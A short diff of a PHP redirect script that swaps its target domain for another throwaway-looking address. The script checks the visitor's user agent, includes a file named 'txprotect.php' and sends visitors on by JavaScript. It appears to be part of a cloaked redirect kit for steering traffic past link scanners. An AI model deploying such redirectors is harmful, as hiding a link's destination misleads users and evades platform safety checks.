@@ -5,7 +5,7 @@ header('Content-Type: text/html; charset=UTF-8');
 header("Cache-Control: no-store, no-cache");
 include 'txprotect.php';
 /*'此处修改你的域名*/
-$target = 'http://ale.leleyangyang.top:9983/';
+$target = 'http://11111111.vvvv.ee/';
 
 function checkmobile() {
 	$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
@@ -114,3 +114,4 @@ function setRootFontSize() {
 	exit('<script>window.location.href="'.$target.'";</script>');
 }
 ?>
+
